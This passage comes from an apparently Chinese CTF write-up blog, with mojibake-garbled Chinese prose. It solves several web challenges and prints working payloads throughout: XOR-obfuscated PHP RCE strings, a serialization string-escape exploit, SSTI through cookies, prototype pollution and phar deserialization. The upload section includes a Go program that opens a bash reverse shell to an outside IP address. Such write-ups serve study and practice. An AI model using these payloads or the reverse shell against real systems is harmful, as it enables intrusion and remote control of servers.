class="built_in">ord</span>(m) == <span class="built_in">ord</span>(i):</span><br><span class="line">                    <span class="keyword">if</span>(j == k <span class="keyword">or</span> j == m <span class="keyword">or</span> m == k):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(i+<span class="string">&#x27;==&#x27;</span>+j + <span class="string">&#x27;^&#x27;</span> + k + <span class="string">&#x27;^&#x27;</span>+m, end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(</span><br><span class="line">                            <span class="string">&#x27;&#123;:0&gt;2&#125;  =&gt;  [&quot;&#123;:0&gt;2&#125;&quot;,&quot;&#123;:0&gt;2&#125;&quot;,&quot;&#123;:0&gt;2&#125;&quot;]&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">                                en(i), en(j), en(k), en(m)))</span><br><span class="line">                        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n==d^i^c	91  =&gt;  [&quot;9b&quot;,&quot;96&quot;,&quot;9c&quot;]</span><br><span class="line">p==r^a^c	8f  =&gt;  [&quot;8d&quot;,&quot;9e&quot;,&quot;9c&quot;]</span><br><span class="line">t==d^s^c	8b  =&gt;  [&quot;9b&quot;,&quot;8c&quot;,&quot;9c&quot;]</span><br></pre></td></tr></table></figure>

<p>print_r(scandir(â€˜.â€™))</p>
<p>å¾€ä¸‹å˜ï¼šä»¥ä¸‹ä¸¤ç§éƒ½è¡Œï¼Œå¯ä»¥æ„é€ å¾ˆå¤šå¾ˆå¤šç§ï¼Œæ›¿æ¢å“ªç§éƒ½æ²¡äº‹ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8f%8d%96%96%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%8c%ff%ff%ff)^(%ff%ff%ff%8b%ff%ff%ff))(((%8c%9c%9c%96%8c%96%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%8f%8c%9c%ff%ff)^(%ff%ff%8d%8b%8b%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8d%8d%96%9b%9b%a0%8d)^(%9e%ff%ff%96%8c%ff%ff)^(%9c%ff%ff%9c%9c%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%9b%9b%96%8d)^(%ff%ff%ff%96%ff%ff%ff)^(%ff%ff%ff%9c%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218164943899.png" alt="image-20241218164943899"></p>
<p>æƒ³è¦è¯»å–çš„è¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(&#x27;.&#x27;)))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">((%8D%9A%9E%9B%99%96%93%9A)^(%ff%ff%ff%ff%ff%ff%ff))</span><br><span class="line">((%9A%91%9B)^(%ff%ff%ff))</span><br><span class="line">((%8C%9C%9E%91%9B%96%8D)^(%ff%ff%ff%ff%ff%ff%ff))</span><br><span class="line">((%D1)^(%ff))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d==l^a^i	9b  =&gt;  [&quot;93&quot;,&quot;9e&quot;,&quot;96&quot;]</span><br><span class="line">i==f^n^a	96  =&gt;  [&quot;99&quot;,&quot;91&quot;,&quot;9e&quot;]</span><br><span class="line">c==a^l^n	9c  =&gt;  [&quot;9e&quot;,&quot;93&quot;,&quot;91&quot;]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((%8c%9a%9e%9b%9c%96%93%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff)^(%9b%ff%ff%ff%93%ff%ff%ff)^(%9a%ff%ff%ff%96%ff%ff%ff))(((%9a%9c%9b)^(%ff%ff%ff)^(%ff%93%ff)^(%ff%9e%ff))(((%8c%9c%9e%9c%9b%96%8c)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%93%ff%ff%9b)^(%ff%ff%ff%9e%ff%ff%9a))(%d1^%ff)));</span><br></pre></td></tr></table></figure>





<h2 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸å¤ªæ¸…æ¥šè¿™ä¸ªåºåˆ—åŒ–åæ˜¯é•¿å•¥æ ·çš„ï¼Œæœ¬åœ°è·‘ä¸€ä¸‹çœ‹çœ‹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:5:&quot;b1234&quot;;s:3:&quot;img&quot;;s:40:&quot;da39a3ee5e6b4b0d3255bfef95601890afd80709&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªsha1æ˜¯éœ€è¦ç»•è¿‡çš„ï¼</p>
<p>ä½†æ˜¯è¿™è¦å’‹ç»•å•Šï¼Ÿå‘ç°æœ‰ä¸ªfilterä¼šè¿‡æ»¤æ‰å­—ç¬¦ä¸²ï¼Œå¯ä»¥è€ƒè™‘å­—ç¬¦ä¸²é€ƒé€¸ï¼ŒæŠŠimgé€ƒé€¸å‡ºæ¥ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±æ„é€ ï¼</p>
<p>å­˜åœ¨extract($_POST);å˜é‡è¦†ç›–ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = $function;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¿©éƒ½æ˜¯å¯æ§çš„ã€‚</p>
<p>functionå¯æ§ï¼Œæˆ‘ä»¬åœ¨é‡Œé¢å¼„imgç„¶åé—­åˆå°±è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬ç”¨useræ¥è¿›è¡Œé€ƒé€¸ï¼Œåæ‰<code>&quot;;s:8:&quot;function&quot;;s:xx:&quot;</code>ï¼Œ23ä¸ªå­—ç¬¦ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagflagflagflagflagphp</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸ªhintå°±æ˜¯d0g3_f1ag.php</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220124913426.png" alt="image-20241220124913426" style="zoom:80%;" />

<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220124906163.png" alt="image-20241220124906163" style="zoom:80%;" />

<p>okæ‹¿æäº†ã€‚&#x2F;d0g3_fllllllag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure>

<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220125010556.png" alt="image-20241220125010556" style="zoom:80%;" />

<p>NSSCTF{eb4bcc79-d54c-4437-af0a-d13b88c05373}</p>
<h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p>æ‰“å¼€é¡µé¢æœ‰ä¸‰ä¸ªè¶…é“¾æ¥ï¼Œé›†æˆä¸€ä¸‹ä¿¡æ¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/welcome.txt</span><br><span class="line">fa7aa3ea2a63d3e3f984fc2f952b9d95</span><br><span class="line"></span><br><span class="line">/hints.txt</span><br><span class="line">9dd148c6b068df197ef0c4d592565839</span><br><span class="line"></span><br><span class="line">/flag.txt</span><br><span class="line">7f5f6f0a3e742f57e0c66c6e2989e494</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">md5(cookie_secret+md5(filename))</span><br><span class="line"></span><br><span class="line">/fllllllllllllag</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬éœ€è¦è·å–cookie_secretçš„å€¼</p>
<p>è€Œæˆ‘ä»¬æŸ¥å®˜æ–¹æ–‡æ¡£ï¼Œtornadoåœ¨æ­å»ºä¸€ä¸ªç½‘ç«™æ—¶ï¼Œè‚¯å®šä¼šæœ‰å¤šä¸ªhandlerï¼Œè€Œè¿™äº›handleréƒ½æ˜¯RequestHandlerçš„å­ç±»</p>
<p>RequestHandler.settingsåˆæŒ‡å‘self.application.settings</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¯´handler.settingsæŒ‡å‘äº†RequestHandler.settingsäº†ï¼Œå¯¹å§</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220205948150.png" alt="image-20241220205948150"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">128f7343-bd58-429c-80c6-c72b604e2aaf</span><br></pre></td></tr></table></figure>

<p>ç„¶åéªŒè¯ä¸€ä¸‹ï¼Œç”¨flag.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt md5 =&gt; 40dfb7391c19a66939e6b6f4e9898804</span><br><span class="line">2f02cee7-4944-4208-9af2-fae3dad9ce3740dfb7391c19a66939e6b6f4e9898804</span><br><span class="line">9c2b962c16d37c4d7e8d2731f5d589b4</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2f02cee7-4944-4208-9af2-fae3dad9ce373bf9f6cf685a6dd8defadabfb41a03a1</span><br><span class="line">256ccf8b76c09059ce6fa48edd653af9</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220210832925.png" alt="image-20241220210832925"></p>
<h2 id="BJDCTF-2020-Cookie-is-so-subtle"><a href="#BJDCTF-2020-Cookie-is-so-subtle" class="headerlink" title="[BJDCTF 2020]Cookie is so subtle!"></a>[BJDCTF 2020]Cookie is so subtle!</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221130223596.png" alt="image-20241221130223596"></p>
<p>flagç•Œé¢å­˜åœ¨sstiï¼Œæ˜¯twigæ¨¡æ¿å¼•æ“çš„ssti</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221130251349.png" alt="image-20241221130251349" style="zoom: 67%;" />

<p>å‘ç°ä»–ä¼šæŠŠusernameçš„å€¼è®¾ç½®ä¸ºcookieï¼</p>
<p>åŒæ—¶é¡µé¢ä¹Ÿä¼šå›æ˜¾123.</p>
<p>cookieå¤„å¯èƒ½å­˜åœ¨ssti</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221131100031.png" alt="image-20241221131100031" style="zoom: 67%;" />

<p>å®é”¤äº†ï¼Œæƒ³åŠæ³•çœ‹å…¶ä»–ç›®å½•</p>
<p>è¿™é‡Œæƒ³äº†åŠå¤©ï¼Œçªç„¶æƒ³èµ·æ¥ï¼Œls &#x2F;æ˜¯ä¸€åˆ—ä¸€åˆ—è¾“å‡ºçš„ï¼Œæ‰€ä»¥è¿™é‡Œåªè¾“å‡ºäº†ç¬¬ä¸€è¡Œï¼Œæˆ‘ä»¬è®©ä»–æˆè¡Œè¾“å‡ºå³å¯ï¼</p>
<p>åˆšå¼€å§‹è¯•äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -m /   ä¸å¤ªè¡Œï¼Œåªæœ‰å‡ ä¸ª</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls / | xargs   å¯ä»¥</span><br></pre></td></tr></table></figure>

<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221132103107.png" alt="image-20241221132103107" style="zoom:67%;" />

<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221132132933.png" alt="image-20241221132132933" style="zoom:67%;" />





<h2 id="NSSRound-8-Basic-Upload-gogoggo"><a href="#NSSRound-8-Basic-Upload-gogoggo" class="headerlink" title="[NSSRound#8 Basic]Upload_gogoggo"></a>[NSSRound#8 Basic]Upload_gogoggo</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221210444624.png" alt="image-20241221210444624"></p>
<p>å°±ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ç‚¹ï¼Œä¸Šä¼ è¯•è¯•</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221210459298.png" alt="image-20241221210459298" style="zoom: 67%;" />

<p>è¿™æ³¢â€¦.</p>
<p>go webshellï¼Ÿï¼Ÿgo helpï¼Ÿï¼Ÿï¼Ÿè¿™æ˜¯ç”¨goæ‰§è¡Œäº†æˆ‘çš„æ–‡ä»¶åå—ï¼Ÿ</p>
<p>ä¸Šä¼ æ–‡ä»¶åä¸ºhelpè¯•è¯•</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221210551031.png" alt="image-20241221210551031" style="zoom: 67%;" />

<p>è¿™æ˜¯ï¼Ÿï¼Ÿ</p>
<p>å‘½ä»¤æ‰§è¡Œ(go æ–‡ä»¶åå‰ç¼€ æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„)ï¼Ÿ</p>
<p>èƒ½ä¸èƒ½è®©ä»–go run goæ–‡ä»¶</p>
<p>go run run.goï¼Ÿï¼Ÿ</p>
<p>å¯ä»¥å—ï¼Ÿ</p>
<p>run.goæ–‡ä»¶å¦‚ä¸‹ï¼š</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	cmd := exec.Command(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1&quot;</span>)</span><br><span class="line">	out, err := cmd.CombinedOutput()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">		log.Fatalf(<span class="string">&quot;cmd.Run() failed with %s\n&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å¼¹shell</p>
<p>æ ¹ç›®å½•ä¸‹æœ‰ä¸ªflaaaag   TlNTQ1QK</p>
<p>&#x2F;home&#x2F;galf    RntmY2ZjYjIwNS1kZjFhLTQ2NWYtODMzOC0wYzRhMjM2MDEzNmF9Cg&#x3D;&#x3D;</p>
<p>æŠ½è±¡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;fcfcb205-df1a-465f-8338-0c4a2360136a&#125;</span><br></pre></td></tr></table></figure>





<h2 id="MoeCTF-2021-fake-game"><a href="#MoeCTF-2021-fake-game" class="headerlink" title="[MoeCTF 2021]fake game"></a>[MoeCTF 2021]fake game</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093337918.png" alt="image-20241222093337918"></p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093344765.png" alt="image-20241222093344765"></p>
<p>éšä¾¿å‘ä¸ªåŒ…ï¼Œæ­£å¸¸åˆ†é…å±æ€§è‚¯å®šæ˜¯ä¸è¡Œçš„ã€‚</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093408857.png" alt="image-20241222093408857" style="zoom: 67%;" />

<p>æç¤ºmergeï¼ŒåŸå‹é“¾æ±¡æŸ“ã€‚</p>
<p>å¦‚æœä½ å°†æŸä¸€é¡¹å±æ€§å€¼è®¾ä¸º0ï¼Œä½ å°†æ²¡æœ‰è¿™é¡¹å±æ€§ï¼</p>
<p>é‚£ä¹ˆæ±¡æŸ“protoï¼Œå½“å‰æ‰¾ä¸åˆ°å°±æ‰¾ä¹‹å‰çš„ï¼Œå®Œç¾äº†ã€‚</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093449718.png" alt="image-20241222093449718" style="zoom:67%;" />





<h2 id="NSSRound-13-Basic-ez-factors"><a href="#NSSRound-13-Basic-ez-factors" class="headerlink" title="[NSSRound#13 Basic]ez_factors"></a>[NSSRound#13 Basic]ez_factors</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102504323.png" alt="image-20241222102504323"></p>
<p>å› æ•°åˆ†è§£</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102518573.png" alt="image-20241222102518573"></p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102526079.png" alt="image-20241222102526079"></p>
<p>å‘ç°åªèƒ½è¾“å‡ºæ•°å­—ã€‚</p>
<p>é‚£å°±ç”¨odï¼Œè¾“å‡ºå…«è¿›åˆ¶</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102639428.png" alt="image-20241222102639428"></p>
<h2 id="NSSRound-4-SWPU-1zweb-revenge"><a href="#NSSRound-4-SWPU-1zweb-revenge" class="headerlink" title="[NSSRound#4 SWPU]1zweb(revenge)"></a>[NSSRound#4 SWPU]1zweb(revenge)</h2><p>ä¸€é“pharååºåˆ—åŒ–é¢˜ï¼Œä½†æ˜¯è·Ÿä¹‹å‰åšçš„ä¸å¤ªä¸€æ ·</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222111208334.png" alt="image-20241222111208334"></p>
<p>æœ‰ä¸¤ä¸ªåŠŸèƒ½ç‚¹</p>
<p>å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå…ˆè¯»å–index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;ljt&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;dky&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå…¶å®å°±æ˜¯è¦æ„é€ pharæ–‡ä»¶äº†ã€‚</p>
<p>å†è¯»å–upload.phpï¼ŒæŸ¥çœ‹ç›¸å…³è¿‡æ»¤</p>
